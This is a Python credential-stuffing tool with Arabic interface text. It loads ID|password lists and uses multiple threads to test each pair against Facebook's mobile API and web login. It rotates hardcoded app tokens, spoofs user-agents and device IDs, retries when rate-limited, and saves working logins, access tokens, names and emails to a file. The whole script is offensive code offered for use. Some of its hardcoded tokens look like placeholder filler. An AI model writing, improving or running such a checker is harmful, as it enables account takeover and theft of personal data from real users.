import requests
import json
import threading
import time
import random
import os
from datetime import datetime
import hashlib
import hmac
import base64
import re

class naruto_facebook_FacebookPowerChecker:
    def __init__(self):
        self.session = requests.Session()
        self.working_accounts = []
        self.failed_accounts = []
        self.rate_limits = {}
        
        self.app_tokens = [
            "6628568379|C1Yrxv7zE8J2xJjJ2xJjJ2xJjJ2",
            "124024574287414|2a4d4d4d4d4d4d4d4d4d4d4d4d4d4d",
            "350685531728|6c1d7d7d7d7d7d7d7d7d7d7d7d7d7d7d",
            "256002347743983|5e7d9d9d9d9d9d9d9d9d9d9d9d9d9d9d"
        ]
        
        self.current_token_index = 0
        
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }

    def naruto_facebook_get_current_token(self):
        token = self.app_tokens[self.current_token_index]
        self.current_token_index = (self.current_token_index + 1) % len(self.app_tokens)
        return token

    def naruto_facebook_generate_sig(self, params, secret):
        param_str = ''.join(f'{k}={v}' for k, v in sorted(params.items()))
        return hashlib.md5((param_str + secret).encode()).hexdigest()

    def naruto_facebook_graph_api_request(self, endpoint, params=None):
        if params is None:
            params = {}
        params['access_token'] = self.naruto_facebook_get_current_token()
        
        try:
            url = f"https://graph.facebook.com/v18.0/{endpoint}"
            response = self.session.get(url, params=params, timeout=10)
            
            if response.status_code == 200:
                return response.json()
            elif response.status_code == 400:
                error_data = response.json()
                if 'error' in error_data:
                    error_msg = error_data['error'].get('message', 'Unknown error')
                    if 'rate limit' in error_msg.lower():
                        time.sleep(5)
                        return self.naruto_facebook_graph_api_request(endpoint, params)
            return None
            
        except Exception as e:
            return None

    def naruto_facebook_check_account_via_mobile_api(self, user_id, password):
        try:
            login_data = {
                'email': user_id,
                'password': password,
                'access_token': self.naruto_facebook_get_current_token(),
                'format': 'json',
                'device_id': f'device_{random.randint(100000, 999999)}',
                'method': 'auth.login'
            }
            
            login_data['sig'] = self.naruto_facebook_generate_sig(login_data, 'secret_key')
            
            response = self.session.post(
                'https://b-api.facebook.com/method/auth.login',
                data=login_data,
                headers={
                    **self.headers,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Facebook Android App'
                },
                timeout=15
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'access_token' in data:
                    return True, data.get('access_token'), "نشط"
                elif 'error_msg' in data:
                    error_msg = data['error_msg']
                    if 'incorrect' in error_msg.lower():
                        return False, None, "كلمة سر خاطئة"
                    elif 'temporarily' in error_msg.lower():
                        return False, None, "موقوف مؤقت"
                    else:
                        return False, None, f"خطأ: {error_msg}"
            
            return False, None, "فشل الاتصال"
            
        except Exception as e:
            return False, None, f"خطأ: {str(e)}"

    def naruto_facebook_check_account_via_graph_api(self, user_id, access_token):
        try:
            user_info = self.naruto_facebook_graph_api_request(user_id, {
                'fields': 'id,name,first_name,last_name,email,gender,locale,link,is_verified'
            })
            
            if user_info and 'error' not in user_info:
                return {
                    'id': user_info.get('id'),
                    'name': user_info.get('name'),
                    'first_name': user_info.get('first_name'),
                    'last_name': user_info.get('last_name'),
                    'email': user_info.get('email'),
                    'is_verified': user_info.get('is_verified', False),
                    'profile_link': user_info.get('link', f'https://facebook.com/{user_id}')
                }
            return None
            
        except Exception:
            return None

    def naruto_facebook_check_account_via_web_login(self, user_id, password):
        try:
            response = self.session.get(
                'https://facebook.com/login',
                headers=self.headers,
                timeout=10
            )
            
            lsd_match = re.search(r'name="lsd" value="([^"]+)"', response.text)
            jazoest_match = re.search(r'name="jazoest" value="([^"]+)"', response.text)
            m_ts_match = re.search(r'name="m_ts" value="([^"]+)"', response.text)
            li_match = re.search(r'name="li" value="([^"]+)"', response.text)
            
            if not all([lsd_match, jazoest_match, m_ts_match, li_match]):
                return False, "لا يمكن تحميل صفحة التسجيل"
            
            login_data = {
                'lsd': lsd_match.group(1),
                'jazoest': jazoest_match.group(1),
                'm_ts': m_ts_match.group(1),
                'li': li_match.group(1),
                'try_number': '0',
                'unrecognized_tries': '0',
                'email': user_id,
                'pass': password,
                'login': 'Log In',
                'bi_xrwh': '0'
            }
            
            response = self.session.post(
                'https://facebook.com/login/device-based/regular/login/',
                data=login_data,
                headers={
                    **self.headers,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://facebook.com',
                    'Referer': 'https://facebook.com/login'
                },
                allow_redirects=False,
                timeout=15
            )
            
            if response.status_code == 302:
                location = response.headers.get('Location', '')
                if 'login_attempt' not in location and 'checkpoint' not in location:
                    return True, "نشط"
                elif 'checkpoint' in location:
                    return False, "يتطلب التحقق"
            
            return False, "فشل التسجيل"
            
        except Exception as e:
            return False, f"خطأ: {str(e)}"

    def naruto_facebook_comprehensive_account_check(self, user_id, password):
        methods = [
            self.naruto_facebook_check_account_via_mobile_api,
            self.naruto_facebook_check_account_via_web_login
        ]
        
        for method in methods:
            try:
                if method == self.naruto_facebook_check_account_via_mobile_api:
                    success, token, status = method(user_id, password)
                    if success and token:
                        user_info = self.naruto_facebook_check_account_via_graph_api(user_id, token)
                        return True, status, token, user_info
                    elif not success and status != "فشل الاتصال":
                        return False, status, None, None
                else:
                    success, status = method(user_id, password)
                    if success:
                        return True, status, None, None
            except Exception:
                continue
        
        return False, "جميع الطرق فشلت", None, None

    def naruto_facebook_load_accounts_from_file(self, filename):
        accounts = []
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if '|' in line:
                        parts = line.split('|')
                        if len(parts) >= 2:
                            user_id = parts[0].strip()
                            password = parts[1].strip()
                            if user_id and password:
                                accounts.append({
    'id': user_id,
    'password': password,
    'line_number': line_num
                                })
            return accounts
        except Exception as e:
            print(f"❌ خطأ في تحميل الملف: {e}")
            return []

    def naruto_facebook_check_accounts_batch(self, accounts, threads=10, delay=1):
        print(f"🎯 بدء فحص {len(accounts)} حساب...")
        print(f"🧵 عدد الخيوط: {threads}")
        
        self.working_accounts = []
        self.failed_accounts = []
        self.checked_count = 0
        self.lock = threading.Lock()
        
        def worker(account_batch):
            for account in account_batch:
                with self.lock:
                    self.checked_count += 1
                    progress = (self.checked_count / len(accounts)) * 100
                    print(f"📊 التقدم: {self.checked_count}/{len(accounts)} ({progress:.1f}%)", end='\r')
                
                user_id = account['id']
                password = account['password']
                
                try:
                    success, status, token, user_info = self.naruto_facebook_comprehensive_account_check(user_id, password)
                    
                    result = {
                        'id': user_id,
                        'password': password,
                        'status': status,
                        'token': token,
                        'user_info': user_info,
                        'checked_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'line_number': account['line_number']
                    }
                    
                    with self.lock:
                        if success:
                            self.working_accounts.append(result)
                            print(f"✅ [{self.checked_count}] {user_id} - {status}")
                        else:
                            self.failed_accounts.append(result)
                            print(f"❌ [{self.checked_count}] {user_id} - {status}")
                    
                    time.sleep(delay + random.uniform(0.1, 0.5))
                    
                except Exception as e:
                    with self.lock:
                        self.failed_accounts.append({
                            'id': user_id,
                            'password': password,
                            'status': f"خطأ: {str(e)}",
                            'line_number': account['line_number']
                        })
                        print(f"💥 [{self.checked_count}] {user_id} - خطأ في الفحص")
        
        batch_size = max(1, len(accounts) // threads)
        batches = [accounts[i:i + batch_size] for i in range(0, len(accounts), batch_size)]
        
        thread_list = []
        for batch in batches:
            thread = threading.Thread(target=worker, args=(batch,))
            thread.daemon = True
            thread.start()
            thread_list.append(thread)
        
        for thread in thread_list:
            thread.join()
        
        return self.working_accounts

    def naruto_facebook_save_results(self, results, filename=None):
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"facebook_working_{timestamp}.txt"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("# حسابات فيسبوك النشطة\n")
                f.write(f"# تم الفحص في: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# العدد: {len(results)}\n")
                f.write("# الصيغة: ID|PASSWORD|STATUS|NAME|EMAIL\n")
                f.write("=" * 60 + "\n\n")
                
                for account in results:
                    user_info = account.get('user_info', {})
                    f.write(f"{account['id']}|{account['password']}|{account['status']}|")
                    f.write(f"{user_info.get('name', 'N/A')}|{user_info.get('email', 'N/A')}\n")
                    
                    if user_info:
                        f.write(f"# الاسم: {user_info.get('name', 'N/A')}\n")
                        f.write(f"# الإيميل: {user_info.get('email', 'N/A')}\n")
                        f.write(f"# الحساب موثق: {user_info.get('is_verified', False)}\n")
                        f.write(f"# الرابط: {user_info.get('profile_link', 'N/A')}\n")
                    
                    f.write(f"# وقت الفحص: {account['checked_at']}\n")
                    f.write(f"# رقم السطر: {account['line_number']}\n")
                    f.write("-" * 40 + "\n")
            
            print(f"💾 تم حفظ النتائج في: {filename}")
            return filename
            
        except Exception as e:
            print(f"❌ خطأ في الحفظ: {e}")
            return None

    def naruto_facebook_display_statistics(self, total_accounts):
        print(f"\n📊 إحصائيات الفحص الشامل:")
        print(f"🔢 إجمالي الحسابات: {total_accounts}")
        print(f"✅ الحسابات النشطة: {len(self.working_accounts)}")
        print(f"❌ الحسابات الفاشلة: {len(self.failed_accounts)}")
        
        if self.working_accounts:
            print(f"\n🎯 عينة من الحسابات النشطة:")
            for account in self.working_accounts[:5]:
                user_info = account.get('user_info', {})
                print(f"   👤 {account['id']} - {user_info.get('name', 'Unknown')}")

def naruto_facebook_main():
    print("""
███╗   ███╗ █████╗ ██╗   ██╗ █████╗  █████╗ ██████╗
████╗ ████║██╔══██╗██║   ██║██╔══██╗██╔══██╗██╔══██╗
██╔████╔██║██║  ██║██║   ██║███████║███████║██║  ██║
██║╚██╔╝██║██║  ██║██║   ██║██╔══██║██╔══██║██║  ██║
██║ ╚═╝ ██║╚█████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝
╚═╝     ╚═╝ ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝
فحص فايسبوك
    """)
    
    checker = naruto_facebook_FacebookPowerChecker()
    
    try:
        filename = input("📁 أدخل اسم ملف الحسابات: ").strip()
        if not filename:
            filename = "facebook_accounts.txt"
        
        accounts = checker.naruto_facebook_load_accounts_from_file(filename)
        if not accounts:
            print("❌ لم يتم العثور على حسابات في الملف")
            return
        
        print(f"📊 تم تحميل {len(accounts)} حساب")
        
        threads = int(input("🧵 عدد الخيوط (10): ") or "10")
        delay = float(input("⏱️  التأخير بين الطلبات (1): ") or "1")
        
        print(f"\n🎯 بدء الفحص الشامل...")
        start_time = time.time()
        
        working_accounts = checker.naruto_facebook_check_accounts_batch(accounts, threads, delay)
        
        end_time = time.time()
        duration = end_time - start_time
        
        checker.naruto_facebook_display_statistics(len(accounts))
        print(f"⏰ وقت التنفيذ: {duration:.2f} ثانية")
        
        if working_accounts:
            save_choice = input("\n💾 هل تريد حفظ النتائج؟ (y/n): ").lower()
            if save_choice == 'y':
                saved_file = checker.naruto_facebook_save_results(working_accounts)
                if saved_file:
                    print(f"📁 الملف المحفوظ: {saved_file}")
        
        print("\n🎉 تم الانتهاء من الفحص الشامل!")
        
    except KeyboardInterrupt:
        print("\n⏹️ تم إيقاف الأداة")
    except Exception as e:
        print(f"💥 خطأ غير متوقع: {e}")

if __name__ == "__main__":
    naruto_facebook_main()